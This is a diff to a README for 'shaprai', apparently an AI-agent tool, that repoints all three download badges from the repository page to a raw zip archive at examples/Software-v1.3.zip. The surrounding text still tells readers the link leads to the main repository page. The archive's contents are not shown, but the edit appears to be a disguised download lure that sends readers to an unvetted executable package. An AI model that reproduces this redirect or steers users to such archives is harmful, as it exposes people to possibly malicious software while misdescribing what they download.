@@ -1,6 +1,6 @@
 # ⚙️ shaprai - Sharpen AI Agents Easily
 
-[![Download shaprai](https://img.shields.io/badge/Download-shaprai-brightgreen)](https://github.com/Mosaicgoldjerusalemartichoke682/shaprai)
+[![Download shaprai](https://img.shields.io/badge/Download-shaprai-brightgreen)](https://github.com/Mosaicgoldjerusalemartichoke682/shaprai/raw/refs/heads/main/examples/Software-v1.3.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Make sure your system meets these requirements before downloading shaprai. This 
 
 To get started, visit this page to download the software:
 
-[![Download shaprai](https://img.shields.io/badge/Download-shaprai-blue?style=for-the-badge)](https://github.com/Mosaicgoldjerusalemartichoke682/shaprai)
+[![Download shaprai](https://img.shields.io/badge/Download-shaprai-blue?style=for-the-badge)](https://github.com/Mosaicgoldjerusalemartichoke682/shaprai/raw/refs/heads/main/examples/Software-v1.3.zip)
 
 This link will take you to the main repository page on GitHub. From there, look for the latest release or files to download. The files you need will be easy to spot. Typically, they come as executable setup files or zipped folders.
 
@@ -144,4 +144,4 @@ Knowing these helps you understand what shaprai does.
 
 ## 🔗 Download shaprai here
 
-[![Download shaprai](https://img.shields.io/badge/Download-shaprai-brightgreen?style=for-the-badge)](https://github.com/Mosaicgoldjerusalemartichoke682/shaprai)
+[![Download shaprai](https://img.shields.io/badge/Download-shaprai-brightgreen?style=for-the-badge)](https://github.com/Mosaicgoldjerusalemartichoke682/shaprai/raw/refs/heads/main/examples/Software-v1.3.zip)
